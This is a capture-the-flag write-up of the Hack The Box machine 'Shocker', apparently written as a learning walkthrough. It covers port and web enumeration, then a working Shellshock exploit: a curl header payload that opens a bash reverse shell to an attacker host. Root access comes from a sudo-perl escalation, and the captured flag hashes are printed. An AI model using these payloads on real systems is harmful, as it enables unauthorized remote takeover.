---
description: 10.10.10.56
---

# Shocker

![](<../../.gitbook/assets/1 (8).JPG>)

## Overview

The following exploits are covered for obtaining the flags on this target: ​

* User - Exposed shell script on webapp is vulnerable to shellshock. Get shell as user "shelley" using curl to exploit it.&#x20;
* Root - User "shelley" can run "perl" as root via sudo.

## Enumeration:

### Nmap

Let's begin with a basic nmap scan for all TCP ports:

```
└─$ nmap -p- 10.10.10.56
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-24 11:40 EST
Nmap scan report for 10.10.10.56
Host is up (0.071s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 21.60 seconds

```

Now that we have a list of open ports, let's run a more targeted nmap scan:

```
└─$ sudo nmap -sS -sV -sC -A -p 80,2222 10.10.10.56 -n
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-24 11:41 EST
Nmap scan report for 10.10.10.56
Host is up (0.015s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.13 (95%), Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.12 (95%), Linux 3.18 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 4.4 (95%), Linux 4.9 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   13.70 ms 10.10.14.1
2   13.94 ms 10.10.10.56

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.53 seconds

```

### Whatweb

Let's run whatweb against the target to see which technologies are being used for the webapp.

```
└─$ whatweb http://10.10.10.56/
http://10.10.10.56/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.56]                                                                                        
                            
```

### Nikto

Let's run a Nikto scan against the target.

```
└─$ nikto -host http://10.10.10.56 -C all                                                                     2 ⚙
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.56
+ Target Hostname:    10.10.10.56
+ Target Port:        80
+ Start Time:         2021-11-24 11:48:22 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 89, size: 559ccac257884, mtime: gzip
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 26470 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2021-11-24 11:56:56 (GMT-5) (514 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

### Gobuster

Let's run gobuster against the target, and specify some file extensions to look for as well:

```
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.56/ -q -f -t 100 -x php,sh,bak,txt
/icons/ (Status: 403)
/cgi-bin/ (Status: 403)
/server-status/ (Status: 403)

```

We find a /cgi-bin/ directory, let's re-run gobuster against this directory:

```
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.56/cgi-bin/ -q -f -t 100 -x php,sh,bak,txt
/user.sh (Status: 200)

```

We find the user.sh file, which we'll explore shortly.

## Website exploration

#### Review the source code for each page

Let's have a look at the page source and make a note of anything interesting:

* There is nothing on the webpage except an image, no source to review

#### Review the source code for any scripts that are being used on each page

Let's have a look at the scripts using the browser dev tools and make a note of anything interesting:

* No scripts

Let's checkout the shell script we found earlier at [http://10.10.10.56/cgi-bin/user.sh](http://10.10.10.56/cgi-bin/user.sh). Connecting to this in the browser downloads the output from the script at that specific time:

```
└─$ cat user.sh                                                                                             130 ⨯
Content-Type: text/plain

Just an uptime test script

 12:54:58 up  1:19,  0 users,  load average: 0.60, 1.16, 0.92

```

Let's test this with curl:

```
└─$ curl http://10.10.10.56/cgi-bin/user.sh                                                 
Content-Type: text/plain

Just an uptime test script

 12:59:43 up  1:23,  0 users,  load average: 0.84, 1.23, 1.02

```

Since this is a shell script, we should check for shellshock, which is a remote command execution vulnerability in bash.

{% embed url="https://en.wikipedia.org/wiki/Shellshock_(software_bug)" %}

{% embed url="https://www.exploit-db.com/docs/48112" %}

We can also test this with a nmap script as follows:

```
└─$ sudo nmap --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=id -p 80 10.10.10.56
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-24 13:28 EST
Nmap scan report for 10.10.10.56
Host is up (0.013s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     Exploit results:
|       <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
|   <html><head>
|   <title>500 Internal Server Error</title>
|   </head><body>
|   <h1>Internal Server Error</h1>
|   <p>The server encountered an internal error or
|   misconfiguration and was unable to complete
|   your request.</p>
|   <p>Please contact the server administrator at 
|    webmaster@localhost to inform them of the time this error occurred,
|    and the actions you performed just before this error.</p>
|   <p>More information about this error may be available
|   in the server error log.</p>
|   <hr>
|   <address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80</address>
|   </body></html>
|   
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       http://seclists.org/oss-sec/2014/q3/685
|_      http://www.openwall.com/lists/oss-security/2014/09/24/10

Nmap done: 1 IP address (1 host up) scanned in 7.26 seconds

```

## Gaining Access

Based on our research (article above and links in Resources section), we managed to get a reverse shell using the following command:

> curl -A '() { :;}; /bin/bash -i >& /dev/tcp/10.10.14.3/8585 0>&1' http://10.10.10.56/cgi-bin/user.sh

```
└─$ nc -nvlp 8585
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8585
Ncat: Listening on 0.0.0.0:8585
Ncat: Connection from 10.10.10.56.
Ncat: Connection from 10.10.10.56:37822.
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ id
id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
shelly@Shocker:/usr/lib/cgi-bin$ 
```

We can also grab the user flag:

```
shelly@Shocker:/usr/lib/cgi-bin$ cd ~
cd ~
shelly@Shocker:/home/shelly$ ls
ls
user.txt
shelly@Shocker:/home/shelly$ cat user.txt
cat user.txt
9f44bf6868b9724be5684bfe0f38b47e
shelly@Shocker:/home/shelly$ 
```

## Privilege Escalation

Let's check if use "shelley" can run any commands as root:

```
shelly@Shocker:/home/shelly$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
shelly@Shocker:/home/shelly$
```

Checking GTFObins, we find an entry for perl. Let's use it to escalate our privileges and grab the root flag:

```
shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/sh";'
sudo perl -e 'exec "/bin/sh";'
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
cat root.txt
d911dbb0e362fa75428fc5ca9acb75a9
exit

```

## Resources

{% embed url="https://resources.infosecinstitute.com/topic/practical-shellshock-exploitation-part-2" %}

{% embed url="https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf" %}

{% embed url="https://blog.cloudflare.com/inside-shellshock" %}







